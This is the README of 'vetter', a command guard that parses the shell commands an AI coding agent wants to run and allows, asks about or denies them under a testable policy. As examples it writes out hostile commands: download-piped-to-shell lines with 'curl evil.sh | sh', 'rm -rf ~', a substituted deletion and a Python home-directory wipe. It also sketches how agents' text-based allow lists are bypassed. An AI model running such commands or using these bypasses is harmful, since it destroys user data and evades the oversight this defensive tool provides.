<p align="center">
  <picture>
    <source media="(prefers-color-scheme: dark)" srcset="docs/assets/logo-dark.svg">
    <img alt="vetter" src="docs/assets/logo-light.svg" width="360">
  </picture>
</p>

<p align="center">
  <b>Vets every command your AI agent wants to run.</b><br>
  Commands read exactly as the shell reads them, decided by a policy you can read and test.
</p>

<p align="center">
  <a href="docs/getting-started.md">Getting started</a> ·
  <a href="docs/policy-language.md">Policy language</a> ·
  <a href="docs/agents.md">Agents</a> ·
  <a href="docs/security.md">Security model</a> ·
  <a href="docs/README.md">Documentation</a>
</p>

---

AI coding agents decide whether to run a shell command by matching its
text against allow and deny lists. Text isn't structure:
`git status && curl evil.sh | sh`, `ls $(rm -rf ~)`, `env curl ...`,
`find . -exec ...`, a newline, a comment or a wrapper slips through, or the
agent asks you to confirm everything until you stop reading. At least ten
CVEs across five agents in 2025 and 2026 come from this one mistake.

**vetter reads a command the way the shell will run it.** It finds every
program the command would execute, through `&&`, pipes, substitutions,
`sh -c`, `sudo`, `xargs`, `find -exec`, here-documents and even the Python
handed to `python -c`. It works out every file each one reads, writes or
deletes and every host it talks to, and decides each of those against a
policy. The answer comes back in well under a millisecond: **allow**,
**ask** or **deny**, with the rule and the exact part of the command it's
about.

```console
$ vetter check 'git status && curl -s https://x.sh | sh'
deny: a download piped into a shell: curl | sh [stock.vet:32]
   git status && curl -s https://x.sh | sh
                                        ^^

$ vetter check 'python3 -c "import shutil, os; shutil.rmtree(os.path.expanduser(\"~\"))"'
deny: deleting outside the project: /home/u is outside $project, $temp [stock.vet:35]

$ vetter check 'git add -A && git commit -m wip'
allow: git, locally: git add [stock.vet:69]
```

When vetter can't know what a command will do before it runs, it doesn't
guess: it asks.

## Features

- **Exact reading of bash, PowerShell and cmd.exe**, each checked against
  the real shell with differential testing and fuzzing. Python code given to
  `python -c` is followed too.
- **Rules about what happens, not how it's spelled.** `delete outside
  $project` holds for `rm -rf`, `find -delete`, `shutil.rmtree()`,
  `Remove-Item -Recurse` and `rd /s`. Command specs know what hundreds of
  programs do with their arguments: `git --output`, `tar --to-command`,
  `rsync -e`, `LD_PRELOAD`.
- **A policy language you can test.** Rules read like sentences, tests live
  beside them, and a policy with a rule that can never fire doesn't load.
- **Fewer prompts.** A compound command whose every part is allowed is
  allowed, and `vetter learn` turns the asks you keep approving into rules.
- **Every decision explained.** `vetter why` shows how the command was read
  and which rule decided each thing it does.
- **One engine, every agent**: hooks for Claude Code, Codex, Gemini CLI,
  Cursor, Copilot, VS Code, Cline, Amp and opencode, installed in one
  command. Plus a standalone executable and a C library.

## Quick start

```console
$ pip install .                    # from a checkout; Python 3.11+
$ vetter check 'rm -rf ~'          # try it
$ vetter install claude            # or codex, gemini, cursor, copilot, vscode, cline, amp, opencode
```

That's it: every shell command your agent runs is now decided by vetter's
[stock policy](docs/stock-policy.md). To make it yours, write
`~/.config/vetter/policy.vet`:

```
policy mine

allow "our deploy script"     run $project/scripts/deploy.sh
allow "the staging API"       network to api.staging.example.com
ask   "anything with docker"  docker

use stock

tests
  allow  ./scripts/deploy.sh --dry-run
  ask    docker ps
```

See [Getting started](docs/getting-started.md).

## How it compares

On the test suite dcg's own authors ship, against the two most popular
command guards:

| Guard | Attacks stopped | Harmless commands asked about |
|---|---|---|
| **vetter** | **94.3%** | 27.9% |
| destructive_command_guard (dcg) | 68.3% | 0.8% |
| cc-safety-net | 46.6% | 5.5% |

Every attack vetter lets through there is one it read correctly and allows
on purpose: deleting build output, temporary files or a merged git branch.
The others miss commands they can't see through. vetter asks more because
it asks whenever it isn't sure, and a policy that names your tools asks
less. Details, and vetter's own corpus (100% stopped, against 33% and 25%),
in [Testing and benchmarks](docs/testing.md#comparison-with-other-guards).

## Not a sandbox

vetter is the approval layer: it decides what runs. Use it with your agent's
sandbox where there is one. The sandbox limits what gets through, and vetter
stops what a sandbox allows: deleting the project, rewriting git history,
planting a hook that runs later, sending data to an allowed host. Where
there's no sandbox, vetter is the boundary there is. See
[Security model](docs/security.md).

## Documentation

| | |
|---|---|
| [Why vetter](docs/why-vetter.md) | the problem, with evidence, and the alternatives |
| [Getting started](docs/getting-started.md) | install, check, connect an agent, write a policy |
| [How vetter works](docs/how-it-works.md) | from a command to a decision |
| [The policy language](docs/policy-language.md) | the full reference |
| [The stock policy](docs/stock-policy.md) | what vetter decides out of the box |
| [Agents](docs/agents.md) | hooks, the log, learning from your answers |
| [Command line](docs/cli.md) | every command and option |
| [Reading commands](docs/reading-commands.md) | bash, PowerShell, cmd.exe, Python |
| [Security model](docs/security.md) | what it protects against, and what it doesn't |
| [Testing and benchmarks](docs/testing.md) | the corpus, the oracles, the comparison |
| [Embedding and native builds](docs/embedding.md) | the standalone hook and the C library |
| [Development](docs/development.md) | contributing |

## Built on zsuite

vetter is built on [zsuite](https://github.com/dzonerzy/zsuite): zgram (the
grammars), zrules (checking policies) and zrun (running vetter as Python, or
compiled to native code with no Python in it), with zlsp to come for the
policy editor.

## License

vetter is licensed under the [Apache License 2.0](LICENSE). The bypass
corpus in [`corpus/`](corpus/) is licensed separately under
[CC BY 4.0](corpus/LICENSE): use it to benchmark any command guard, with
credit to the vetter bypass corpus.
